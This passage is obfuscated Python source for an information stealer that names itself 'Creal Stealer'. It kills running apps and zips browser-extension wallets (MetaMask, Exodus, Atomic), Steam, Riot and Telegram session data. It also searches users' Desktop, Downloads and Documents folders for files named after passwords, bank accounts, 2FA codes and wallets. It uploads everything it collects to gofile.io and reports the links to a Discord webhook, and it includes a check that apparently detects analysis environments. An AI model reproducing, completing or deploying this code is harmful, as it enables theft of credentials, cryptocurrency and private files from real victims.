                            Tokens +=O0O000O000O0000OO #line:575
                            uploadToken (O0O000O000O0000OO ,OO0OOO00O0OO0O0OO )#line:577
def GatherZips (O0O0OO00000O0000O ,O00OO0OO00OO0O00O ,OO0OO0OOOO00O00OO ):#line:579
    OO0O0O0OO0OO00O00 =[]#line:580
    for O000O0O00O000O0O0 in O0O0OO00000O0000O :#line:581
        OO000O00OOO0000O0 =threading .Thread (target =ZipThings ,args =[O000O0O00O000O0O0 [0 ],O000O0O00O000O0O0 [5 ],O000O0O00O000O0O0 [1 ]])#line:582
        OO000O00OOO0000O0 .start ()#line:583
        OO0O0O0OO0OO00O00 .append (OO000O00OOO0000O0 )#line:584
    for O000O0O00O000O0O0 in O00OO0OO00OO0O00O :#line:586
        OO000O00OOO0000O0 =threading .Thread (target =ZipThings ,args =[O000O0O00O000O0O0 [0 ],O000O0O00O000O0O0 [2 ],O000O0O00O000O0O0 [1 ]])#line:587
        OO000O00OOO0000O0 .start ()#line:588
        OO0O0O0OO0OO00O00 .append (OO000O00OOO0000O0 )#line:589
    OO000O00OOO0000O0 =threading .Thread (target =ZipTelegram ,args =[OO0OO0OOOO00O00OO [0 ],OO0OO0OOOO00O00OO [2 ],OO0OO0OOOO00O00OO [1 ]])#line:591
    OO000O00OOO0000O0 .start ()#line:592
    OO0O0O0OO0OO00O00 .append (OO000O00OOO0000O0 )#line:593
    for OO000OOO00OO0000O in OO0O0O0OO0OO00O00 :#line:595
        OO000OOO00OO0000O .join ()#line:596
    global WalletsZip ,GamingZip ,OtherZip #line:597
    O0OO00OO00O0O0O00 ,O0000000O0OO0OO0O ,OOOOO0000OOOO0O0O ="",'',''#line:600
    if not len (WalletsZip )==0 :#line:601
        O0OO00OO00O0O0O00 =":coin:  •  Wallets\n"#line:602
        for O0O0OO0OO0OO0O0O0 in WalletsZip :#line:603
            O0OO00OO00O0O0O00 +=f"└─ [{O0O0OO0OO0OO0O0O0[0]}]({O0O0OO0OO0OO0O0O0[1]})\n"#line:604
    if not len (WalletsZip )==0 :#line:605
        O0000000O0OO0OO0O =":video_game:  •  Gaming:\n"#line:606
        for O0O0OO0OO0OO0O0O0 in GamingZip :#line:607
            O0000000O0OO0OO0O +=f"└─ [{O0O0OO0OO0OO0O0O0[0]}]({O0O0OO0OO0OO0O0O0[1]})\n"#line:608
    if not len (OtherZip )==0 :#line:609
        OOOOO0000OOOO0O0O =":tickets:  •  Apps\n"#line:610
        for O0O0OO0OO0OO0O0O0 in OtherZip :#line:611
            OOOOO0000OOOO0O0O +=f"└─ [{O0O0OO0OO0OO0O0O0[0]}]({O0O0OO0OO0OO0O0O0[1]})\n"#line:612
    O0000OOOOOO0O0OOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:616
    O0OOO0OO00O0OOO0O ={"content":globalInfo (),"embeds":[{"title":"Creal Zips","description":f"{O0OO00OO00O0O0O00}\n{O0000000O0OO0OO0O}\n{OOOOO0000OOOO0O0O}","color":000000 ,"footer":{"text":"Creal Stealer","icon_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"}}],"username":"Creal Stealer","avatar_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp","attachments":[]}#line:634
    LoadUrlib (hook ,data =dumps (O0OOO0OO00O0OOO0O ).encode (),headers =O0000OOOOOO0O0OOO )#line:635
def ZipTelegram (OO00OO0000000O0O0 ,OO000000000OOOOO0 ,O00OOO00O00OO0O00 ):#line:638
    global OtherZip #line:639
    O0OO00OO0O0O00000 =OO00OO0000000O0O0 #line:640
    OOO00O0O0000O0O00 =OO000000000OOOOO0 #line:641
    if not os .path .exists (O0OO00OO0O0O00000 ):return #line:642
    subprocess .Popen (f"taskkill /im {O00OOO00O00OO0O00} /t /f >nul 2>&1",shell =True )#line:643
    O0O0OO0OO000OO00O =ZipFile (f"{O0OO00OO0O0O00000}/{OOO00O0O0000O0O00}.zip","w")#line:645
    for O000000OOOO0OOOOO in os .listdir (O0OO00OO0O0O00000 ):#line:646
        if not ".zip"in O000000OOOO0OOOOO and not "tdummy"in O000000OOOO0OOOOO and not "user_data"in O000000OOOO0OOOOO and not "webview"in O000000OOOO0OOOOO :#line:647
            O0O0OO0OO000OO00O .write (O0OO00OO0O0O00000 +"/"+O000000OOOO0OOOOO )#line:648
    O0O0OO0OO000OO00O .close ()#line:649
    O0000O00000O0OO00 =uploadToAnonfiles (f'{O0OO00OO0O0O00000}/{OOO00O0O0000O0O00}.zip')#line:651
    os .remove (f"{O0OO00OO0O0O00000}/{OOO00O0O0000O0O00}.zip")#line:653
    OtherZip .append ([OO000000000OOOOO0 ,O0000O00000O0OO00 ])#line:654
def ZipThings (OO00OO00O0000OO00 ,OOOOO0OOOOOO00OO0 ,OOO0O00O0O0O00000 ):#line:656
    O00OO0000OO0OO00O =OO00OO00O0000OO00 #line:657
    O0O00OO00O00OOOO0 =OOOOO0OOOOOO00OO0 #line:658
    global WalletsZip ,GamingZip ,OtherZip #line:659
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OOOOO0OOOOOO00OO0 :#line:663
        OO00O000O0OOO00OO =OO00OO00O0000OO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:664
        O0O00OO00O00OOOO0 =f"Metamask_{OO00O000O0OOO00OO}"#line:665
        O00OO0000OO0OO00O =OO00OO00O0000OO00 +OOOOO0OOOOOO00OO0 #line:666
    if not os .path .exists (O00OO0000OO0OO00O ):return #line:668
    subprocess .Popen (f"taskkill /im {OOO0O00O0O0O00000} /t /f >nul 2>&1",shell =True )#line:669
    if "Wallet"in OOOOO0OOOOOO00OO0 or "NationsGlory"in OOOOO0OOOOOO00OO0 :#line:671
        OO00O000O0OOO00OO =OO00OO00O0000OO00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:672
        O0O00OO00O00OOOO0 =f"{OO00O000O0OOO00OO}"#line:673
    elif "Steam"in OOOOO0OOOOOO00OO0 :#line:675
        if not os .path .isfile (f"{O00OO0000OO0OO00O}/loginusers.vdf"):return #line:676
        OOO0OOO0000000O0O =open (f"{O00OO0000OO0OO00O}/loginusers.vdf","r+",encoding ="utf8")#line:677
        OO00O0O00000OOOO0 =OOO0OOO0000000O0O .readlines ()#line:678
        OO00OO0000O0000OO =False #line:680
        for O0000OO00OO0OO00O in OO00O0O00000OOOO0 :#line:681
            if 'RememberPassword"\t\t"1"'in O0000OO00OO0OO00O :#line:682
                OO00OO0000O0000OO =True #line:683
        if OO00OO0000O0000OO ==False :return #line:684
        O0O00OO00O00OOOO0 =OOOOO0OOOOOO00OO0 #line:685
    OO0OO00O0OOO00OO0 =ZipFile (f"{O00OO0000OO0OO00O}/{O0O00OO00O00OOOO0}.zip","w")#line:688
    for OOO0OO0OO0O0O0OOO in os .listdir (O00OO0000OO0OO00O ):#line:689
        if not ".zip"in OOO0OO0OO0O0O0OOO :OO0OO00O0OOO00OO0 .write (O00OO0000OO0OO00O +"/"+OOO0OO0OO0O0O0OOO )#line:690
    OO0OO00O0OOO00OO0 .close ()#line:691
    OO000OOOO0OOOO0O0 =uploadToAnonfiles (f'{O00OO0000OO0OO00O}/{O0O00OO00O00OOOO0}.zip')#line:693
    os .remove (f"{O00OO0000OO0OO00O}/{O0O00OO00O00OOOO0}.zip")#line:695
    if "Wallet"in OOOOO0OOOOOO00OO0 or "eogaeaoehlef"in OOOOO0OOOOOO00OO0 :#line:697
        WalletsZip .append ([O0O00OO00O00OOOO0 ,OO000OOOO0OOOO0O0 ])#line:698
    elif "NationsGlory"in O0O00OO00O00OOOO0 or "Steam"in O0O00OO00O00OOOO0 or "RiotCli"in O0O00OO00O00OOOO0 :#line:699
        GamingZip .append ([O0O00OO00O00OOOO0 ,OO000OOOO0OOOO0O0 ])#line:700
    else :#line:701
        OtherZip .append ([O0O00OO00O00OOOO0 ,OO000OOOO0OOOO0O0 ])#line:702
def GatherAll ():#line:705
    ""#line:706
    OO00OO00OO00OO0O0 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:716
    O0OO00OO0OO00000O =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:723
    O00OOOO0OO0O0OO00 =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:731
    OO0O00O0OOO0O0OO0 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:732
    for OOO0O0OOOOO00O0OO in OO00OO00OO00OO0O0 :#line:734
        OOO0O0O0OOO000OO0 =threading .Thread (target =getToken ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [2 ]])#line:735
        OOO0O0O0OOO000OO0 .start ()#line:736
        Threadlist .append (OOO0O0O0OOO000OO0 )#line:737
    for OOO0O0OOOOO00O0OO in O0OO00OO0OO00000O :#line:738
        OOO0O0O0OOO000OO0 =threading .Thread (target =GetDiscord ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [1 ]])#line:739
        OOO0O0O0OOO000OO0 .start ()#line:740
        Threadlist .append (OOO0O0O0OOO000OO0 )#line:741
    for OOO0O0OOOOO00O0OO in OO00OO00OO00OO0O0 :#line:743
        OOO0O0O0OOO000OO0 =threading .Thread (target =getPassw ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [3 ]])#line:744
        OOO0O0O0OOO000OO0 .start ()#line:745
        Threadlist .append (OOO0O0O0OOO000OO0 )#line:746
    O0O0O0OOO0OO0O000 =[]#line:748
    for OOO0O0OOOOO00O0OO in OO00OO00OO00OO0O0 :#line:749
        OOO0O0O0OOO000OO0 =threading .Thread (target =getCookie ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [4 ]])#line:750
        OOO0O0O0OOO000OO0 .start ()#line:751
        O0O0O0OOO0OO0O000 .append (OOO0O0O0OOO000OO0 )#line:752
    threading .Thread (target =GatherZips ,args =[OO00OO00OO00OO0O0 ,O00OOOO0OO0O0OO00 ,OO0O00O0OOO0O0OO0 ]).start ()#line:754
    for O0OOOO000000OO0O0 in O0O0O0OOO0OO0O000 :O0OOOO000000OO0O0 .join ()#line:757
    O00000O0O0000OOOO =Trust (Cookies )#line:758
    if O00000O0O0000OOOO ==True :return #line:759
    for OOO0O0OOOOO00O0OO in OO00OO00OO00OO0O0 :#line:761
         threading .Thread (target =ZipThings ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [5 ],OOO0O0OOOOO00O0OO [1 ]]).start ()#line:762
    for OOO0O0OOOOO00O0OO in O00OOOO0OO0O0OO00 :#line:764
         threading .Thread (target =ZipThings ,args =[OOO0O0OOOOO00O0OO [0 ],OOO0O0OOOOO00O0OO [2 ],OOO0O0OOOOO00O0OO [1 ]]).start ()#line:765
    threading .Thread (target =ZipTelegram ,args =[OO0O00O0OOO0O0OO0 [0 ],OO0O00O0OOO0O0OO0 [2 ],OO0O00O0OOO0O0OO0 [1 ]]).start ()#line:767
    for O0OOOO000000OO0O0 in Threadlist :#line:769
        O0OOOO000000OO0O0 .join ()#line:770
    global upths #line:771
    upths =[]#line:772
    for O0OO00O0O0OO0O0OO in ["wppassw.txt","wpcook.txt"]:#line:774
        upload (O0OO00O0O0OO0O0OO .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+O0OO00O0O0OO0O0OO ))#line:776
def uploadToAnonfiles (OO0000OOOOOO0O000 ):#line:778
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (OO0000OOOOOO0O000 ,'rb')}).json ()["data"]["downloadPage"]#line:779
    except :return False #line:780
def KiwiFolder (O0000000O00O00O00 ,OO0000OOOOO00O00O ):#line:791
    global KiwiFiles #line:792
    O0OOO0O0000O000OO =7 #line:793
    OOO0OO0O0OOOO0OO0 =0 #line:794
    O00OOO000O0OOO000 =os .listdir (O0000000O00O00O00 )#line:795
    OOOOO0O00OO0OOO00 =[]#line:796
    for O000OO0O0O0OOOO0O in O00OOO000O0OOO000 :#line:797
        if not os .path .isfile (O0000000O00O00O00 +"/"+O000OO0O0O0OOOO0O ):return #line:798
        OOO0OO0O0OOOO0OO0 +=1 #line:799
        if OOO0OO0O0OOOO0OO0 <=O0OOO0O0000O000OO :#line:800
            O000O0O0OO0OOO0O0 =uploadToAnonfiles (O0000000O00O00O00 +"/"+O000OO0O0O0OOOO0O )#line:801
            OOOOO0O00OO0OOO00 .append ([O0000000O00O00O00 +"/"+O000OO0O0O0OOOO0O ,O000O0O0OO0OOO0O0 ])#line:802
        else :#line:803
            break #line:804
    KiwiFiles .append (["folder",O0000000O00O00O00 +"/",OOOOO0O00OO0OOO00 ])#line:805
KiwiFiles =[]#line:807
def KiwiFile (OO0O000OOOO0O0OOO ,OO000O0OO0O000O00 ):#line:808
    global KiwiFiles #line:809
    OO0000O0000O00OOO =[]#line:810
    OOO0O0OO0OO0O0OOO =os .listdir (OO0O000OOOO0O0OOO )#line:811
    for O0OOO0O00O000OO0O in OOO0O0OO0OO0O0OOO :#line:812
        for OOO0O0OO0O0O0OOO0 in OO000O0OO0O000O00 :#line:813
            if OOO0O0OO0O0O0OOO0 in O0OOO0O00O000OO0O .lower ():#line:814
                if os .path .isfile (OO0O000OOOO0O0OOO +"/"+O0OOO0O00O000OO0O )and ".txt"in O0OOO0O00O000OO0O :#line:815
                    OO0000O0000O00OOO .append ([OO0O000OOOO0O0OOO +"/"+O0OOO0O00O000OO0O ,uploadToAnonfiles (OO0O000OOOO0O0OOO +"/"+O0OOO0O00O000OO0O )])#line:816
                    break #line:817
                if os .path .isdir (OO0O000OOOO0O0OOO +"/"+O0OOO0O00O000OO0O ):#line:818
                    O0O0OOOO0OOO0OO00 =OO0O000OOOO0O0OOO +"/"+O0OOO0O00O000OO0O #line:819
                    KiwiFolder (O0O0OOOO0OOO0OO00 ,OO000O0OO0O000O00 )#line:820
                    break #line:821
    KiwiFiles .append (["folder",OO0O000OOOO0O0OOO ,OO0000O0000O00OOO ])#line:823
def Kiwi ():#line:825
    O000O00OOOO0O000O =temp .split ("\AppData")[0 ]#line:826
    O0000OO0OO00OOO00 =[O000O00OOOO0O000O +"/Desktop",O000O00OOOO0O000O +"/Downloads",O000O00OOOO0O000O +"/Documents"]#line:831
    O00000O00OO0000OO =["account","acount","passw","secret"]#line:839
    OO0OOO0O0O0OOO000 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:867
    O0OOOO00O0O0OO0O0 =[]#line:869
    for O00OOO0OO000O0O00 in O0000OO0OO00OOO00 :#line:870
        OOO0OOOOO000OO00O =threading .Thread (target =KiwiFile ,args =[O00OOO0OO000O0O00 ,OO0OOO0O0O0OOO000 ]);OOO0OOOOO000OO00O .start ()#line:871
        O0OOOO00O0O0OO0O0 .append (OOO0OOOOO000OO00O )#line:872
    return O0OOOO00O0O0OO0O0 #line:873
global keyword ,cookiWords ,paswWords ,CookiCount ,PasswCount ,WalletsZip ,GamingZip ,OtherZip #line:876
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:880
CookiCount ,PasswCount =0 ,0 #line:882
cookiWords =[]#line:883
paswWords =[]#line:884
WalletsZip =[]#line:886
GamingZip =[]#line:887
OtherZip =[]#line:888
GatherAll ()#line:890
DETECTED =Trust (Cookies )#line:891
if not DETECTED :#line:893
    wikith =Kiwi ()#line:894
    for thread in wikith :thread .join ()#line:896
    time .sleep (0.2 )#line:897
    filetext ="\n"#line:899
    for arg in KiwiFiles :#line:900
        if len (arg [2 ])!=0 :#line:901
            foldpath =arg [1 ]#line:902
            foldlist =arg [2 ]#line:903
            filetext +=f"📁 {foldpath}\n"#line:904
            for ffil in foldlist :#line:906
                a =ffil [0 ].split ("/")#line:907
                fileanme =a [len (a )-1 ]#line:908
                b =ffil [1 ]#line:909
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:910
            filetext +="\n"#line:911
    upload ("kiwi",filetext )
